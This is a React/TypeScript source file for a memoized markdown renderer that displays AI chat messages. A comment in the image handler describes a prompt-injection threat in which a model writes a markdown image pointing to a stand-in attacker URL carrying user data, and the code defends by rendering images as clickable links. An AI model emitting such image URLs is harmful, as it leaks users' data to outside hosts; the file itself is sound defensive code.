'use client'

import { memo } from 'react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import type { Components } from 'react-markdown'

const markdownComponents: Components = {
  h2: ({ children }) => (
    <h2 className="mt-5 mb-2 text-lg font-semibold first:mt-0">{children}</h2>
  ),
  h3: ({ children }) => (
    <h3 className="mt-4 mb-1 text-base font-semibold">{children}</h3>
  ),
  p: ({ children }) => (
    <p className="mb-3 text-sm leading-relaxed">{children}</p>
  ),
  ul: ({ children }) => (
    <ul className="mb-3 ml-4 list-disc space-y-1 text-sm">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="mb-3 ml-4 list-decimal space-y-1 text-sm">{children}</ol>
  ),
  li: ({ children }) => <li className="leading-relaxed">{children}</li>,
  strong: ({ children }) => (
    <strong className="font-semibold">{children}</strong>
  ),
  em: ({ children }) => (
    <em className="italic text-muted-foreground">{children}</em>
  ),
  hr: () => <hr className="my-4 border-muted" />,
  blockquote: ({ children }) => (
    <blockquote className="my-3 border-l-2 border-muted pl-4 text-sm italic text-muted-foreground">
      {children}
    </blockquote>
  ),
  table: ({ children }) => (
    <div className="my-3 overflow-x-auto rounded-md border">
      <table className="w-full text-sm">{children}</table>
    </div>
  ),
  thead: ({ children }) => (
    <thead className="border-b bg-muted/50">{children}</thead>
  ),
  tbody: ({ children }) => <tbody>{children}</tbody>,
  tr: ({ children }) => (
    <tr className="border-b last:border-0">{children}</tr>
  ),
  th: ({ children }) => (
    <th className="px-3 py-2 text-left text-xs font-medium">{children}</th>
  ),
  td: ({ children }) => (
    <td className="px-3 py-2 text-sm">{children}</td>
  ),
  // Model output must never auto-load a remote image: a prompt-injected model
  // could write ![x](https://attacker/?d=<your data>) and the browser would
  // fetch it on render, leaking the data. Show the image as a plain link the
  // user has to click instead (or just its alt text if the URL is not http(s)).
  img: ({ src, alt }) => {
    const label = alt?.trim() || 'image'
    if (typeof src !== 'string' || !/^https?:\/\//i.test(src)) {
      return <span>[{label}]</span>
    }
    return (
      <a
        href={src}
        target="_blank"
        rel="noopener noreferrer nofollow"
        className="underline underline-offset-2"
      >
        [image: {label}]
      </a>
    )
  },
}

interface InterpretationContentProps {
  content: string
  isStreaming: boolean
}

// Memoized: react-markdown parsing is expensive, and this is rendered once per
// chat message. Without memo, every keystroke in the chat input (or every
// streamed token) re-parses the markdown of EVERY message in the thread, so
// typing/streaming gets choppier the longer the conversation. Default shallow
// prop comparison (content + isStreaming) re-parses only the message whose text
// actually changed (the streaming one); completed messages bail out.
export const InterpretationContent = memo(function InterpretationContent({
  content,
  isStreaming,
}: InterpretationContentProps) {
  return (
    <div className="relative">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={markdownComponents}>
        {content}
      </ReactMarkdown>
      {isStreaming && (
        <span className="ml-0.5 inline-block h-4 w-0.5 animate-pulse bg-foreground" />
      )}
    </div>
  )
})
